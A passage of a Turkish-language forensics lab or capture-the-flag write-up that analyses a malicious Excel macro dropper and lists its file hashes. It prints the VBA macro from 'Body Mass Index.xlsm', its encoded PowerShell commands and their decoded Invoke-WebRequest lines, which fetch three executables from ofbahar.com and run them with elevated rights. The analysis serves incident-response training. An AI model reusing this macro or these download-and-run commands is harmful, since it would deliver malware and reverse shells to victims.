![image](https://user-images.githubusercontent.com/88983987/220238651-4ba32492-6178-4bbf-95f3-3e6866ab76ca.png)

Ekstra olarak gelen "hokeren.com" adresi gözüküyor, shared hosting durumu olabilir. Not etmekte fayda var.

Cevap: ```ofbahar.com``` 

# 6. Soru

## Description
> What are the names of the infected malware?

## Solution

3 adet malware dosyasını zaten WireShark yardımıyla bulmuştuk. 

![image](https://user-images.githubusercontent.com/88983987/220381371-a3e8dc2b-831f-43cd-aee6-5ebef2eec975.png)

```
"notamalware.vbs"
"BodyMassIndex.exe"
"accesstoken.exe"
```

Fakat Rick Martin bir Excel dosyasını doldurduktan sonra bunların yaşandığını söylüyor. Bu durumda bu malware dosyalarını droplayan bir excel makro dosyası olmalı.

Bu dosyayı Rick Martin'in "Downloads" klasöründe bulabiliyoruz. Ayrıyeten Outlook gibi uygulamalar dosyaları belirli bir dizine kaydettiği için, kullanıcının web tabanlı bir mail yöneticisi kullandığını düşünebiliriz.

![image](https://user-images.githubusercontent.com/88983987/220381815-1d48f468-5413-428d-b2a9-fbd4c1674cab.png)

"BodyMassIndex.xlsm"

Elimiz değmişken bunu da inceleyelim:) İncelemek için ```"oletools"``` paketi içerisinden ```"olevba.py"``` dosyasını kullanacağız.

https://github.com/decalage2/oletools

```
┌──(root㉿kali)-[/home/kali/Desktop/oletools/oletools]
└─# python olevba.py ../../Body\ Mass\ Index.xlsm 
XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
olevba 0.60.2dev1 on Python 3.11.1 - http://decalage.info/python/oletools
===============================================================================
FILE: ../../Body Mass Index.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

    

Sub Button1_Click()

    Dim Boy As Long
    Dim Kilo As Long
    Dim Ara As Long
    Dim WshShell, BtnCode
    Set oshell = CreateObject("WScript.Shell")
    Set WshShell = CreateObject("WScript.Shell")
    Set shellapp = CreateObject("Shell.Application")
    oshell.Run "powershell -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbwBmAGIAYQBoAGEAcgAuAGMAbwBtAC8AbgBvAHQAYQBtAGEAbAB3AGEAcgBlAC4AdgBiAHMAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABVAHMAZQByAHMAXABSAGkAYwBrAE0AYQByAHQAaQBuAEcAcgBpAG0AZQBzAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABuAG8AdABhAG0AYQBsAHcAYQByAGUALgB2AGIAcwA="
    oshell.Run "powershell -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbwBmAGIAYQBoAGEAcgAuAGMAbwBtAC8AYQBjAGMAZQBzAHMAdABvAGsAZQBuAC4AZQB4AGUAIAAtAE8AdQB0AEYAaQBsAGUAIABDADoAXABVAHMAZQByAHMAXABSAGkAYwBrAE0AYQByAHQAaQBuAEcAcgBpAG0AZQBzAFwAQQBwAHAARABhAHQAYQBcAEwAbwBjAGEAbABcAFQAZQBtAHAAXABBAGMAYwBlAHMAcwBUAG8AawBlAG4ALgBlAHgAZQA="
    oshell.Run "powershell -encodedcommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbwBmAGIAYQBoAGEAcgAuAGMAbwBtAC8AQgBvAGQAeQBNAGEAcwBzAEkAbgBkAGUAeAAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVQBzAGUAcgBzAFwAUgBpAGMAawBNAGEAcgB0AGkAbgBHAHIAaQBtAGUAcwBcAEEAcABwAEQAYQB0AGEAXABMAG8AYwBhAGwAXABUAGUAbQBwAFwAQgBvAGQAeQBNAGEAcwBzAEkAbgBkAGUAeAAuAGUAeABlAA=="
    
    Application.Wait (Now + TimeValue("0:00:10"))
    shellapp.ShellExecute "wscript.exe", "C:\Users\RickMartinGrimes\AppData\Local\Temp\notamalware.vbs", Null, "runas", 1
    
    BtnCode = WshShell.Popup("Please waiting, your BMI is calculating", 10, "Calculating...", 0 + 64)
    
    Boy = Range("C4").Value
    Kilo = Range("C5").Value
    Ara = (Boy / 100) * (Boy / 100)
    Range("C6").Value = Kilo / Ara
End Sub
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Button1_Click       |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ShellExecute        |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|powershell          |May run PowerShell commands                  |
|Suspicious|encodedcommand      |May run PowerShell commands                  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Shell.Application   |May run an application (if combined with     |
|          |                    |CreateObject)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |wscript.exe         |Executable file name                         |
|IOC       |notamalware.vbs     |Executable file name                         |
+----------+--------------------+---------------------------------------------+
```

Butona tıklandığında, birkaç atama yapılmasıyla birlikte Base64 ile encode edilmiş Powershell komutları çalıştırılıyor.

Hemen Decode edelim. Base64den çeviriyoruz ve Null Byte'ları temizliyoruz. 

```Invoke-WebRequest -Uri http://ofbahar.com/notamalware.vbs -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\notamalware.vbs```
```Invoke-WebRequest -Uri http://ofbahar.com/accesstoken.exe -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\AccessToken.exe```
```Invoke-WebRequest -Uri http://ofbahar.com/BodyMassIndex.exe -OutFile C:\Users\RickMartinGrimes\AppData\Local\Temp\BodyMassIndex.exe```

Dosyalar indiriliyor, sonrasında aşağıdaki satırda "notamalware.vbs" dosyası çalıştırılıyor. 
```
    shellapp.ShellExecute "wscript.exe", "C:\Users\RickMartinGrimes\AppData\Local\Temp\notamalware.vbs", Null, "runas", 1
```
Çalışma Sırası:

1- İlk önce Macro içeren Excel Dosyası Rick Martin tarafından çalıştırılıyor.<br>
2- Daha sonrasında Macro tarafından 3 adet Malware indiriliyor.<br>
3- Macro ile "notamalware.vbs" dosyası çalıştırılıyor.<br>
4- "notamalware.vbs" dosyası, ```"C:\Users\RickMartinGrimes\AppData\Local\Temp\"``` konumunda, ```notabadpowershell.ps1``` adında bir dosya oluşturuyor.<br>
5- "notabadpowershell.ps1" dosyası ile, "AccessToken.exe" dosyası çalıştırılıyor.<br>
6- "AccessToken.exe" dosyası privilege değerini yükseltiyor.<br>
7- "AccessToken.exe" dosyası artık daha yüksek bir yetki değerine sahip. Sahip olduğu yetki değeri ile Reverse Shell içeren "BodyMassIndex.exe" dosyasını çalıştırıyor.<br>

Cevap:
```
"notamalware.vbs"
"BodyMassIndex.exe"
"accesstoken.exe"
"BodyMassIndex.xlsm"
```
# 7. Soru

## Description
> What is the hash value of the infected malware?

## Solution

```
┌──(root㉿kali)-[/home/kali/Desktop/malwares]
└─# md5sum *                   
49c11ece1cd9412fa61b9b30302b7c51  accesstoken.exe
556df0cc1d9ece696533a2009b5b24c9  BodyMassIndex.exe
ac44b26b53fdf6eb20ab44b4b6e04792  Body Mass Index.xlsm
d7ebc2ba7b2e2edfbc0ef020bf57303a  notamalware.vbs
                                                                                                                                                                         
┌──(root㉿kali)-[/home/kali/Desktop/malwares]
└─# sha256sum *             
a6926daf37d96d2e22a0421b926e1e84bcc94afbeccdafecd5efa3ab7ec1ccf8  accesstoken.exe
5cdf3c561ac1f1ccd792056ea109d0a6dd378bb74598d18a452401ece64dc254  BodyMassIndex.exe
8a3b884dc48b7002d28ba92b361172eef4e96463e682fd8bfd41bf4d399562fd  Body Mass Index.xlsm
7ea23cc76cf864bb297f4b3a36498ed7dd4061e06f00ea2b206fc350e385a83d  notamalware.vbs
```
                                                                                           
Cevap:
```
accesstoken.exe:
MD5: 49c11ece1cd9412fa61b9b30302b7c51
SHA256: a6926daf37d96d2e22a0421b926e1e84bcc94afbeccdafecd5efa3ab7ec1ccf8

BodyMassIndex.exe:
MD5: 556df0cc1d9ece696533a2009b5b24c9
SHA256: 5cdf3c561ac1f1ccd792056ea109d0a6dd378bb74598d18a452401ece64dc254

Body Mass Index.xlsm:
MD5: ac44b26b53fdf6eb20ab44b4b6e04792
SHA256: 8a3b884dc48b7002d28ba92b361172eef4e96463e682fd8bfd41bf4d399562fd

notamalware.vbs:
MD5: d7ebc2ba7b2e2edfbc0ef020bf57303a
SHA256: 7ea23cc76cf864bb297f4b3a36498ed7dd4061e06f00ea2b206fc350e385a83d
```

